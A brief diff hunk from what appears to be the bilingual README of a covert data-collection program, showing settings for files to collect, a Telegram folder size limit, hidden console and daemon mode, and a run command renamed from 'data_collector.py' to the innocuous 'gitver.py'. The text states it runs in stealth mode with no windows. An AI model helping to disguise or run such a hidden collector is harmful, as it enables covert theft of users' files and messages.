@@ -67,9 +67,11 @@ MAX_FILES_TO_COLLECT = 50
 MAX_TELEGRAM_FOLDER_SIZE = 600
 HIDE_CONSOLE = True
 RUN_AS_DAEMON = True
+```
 Запуск / Execution
-bash
-python data_collector.py
+```
+python gitver.py
+```
 В скрытом режиме (Windows) программа не показывает никаких окон.
 In stealth mode (Windows) the program runs without showing any windows.
 
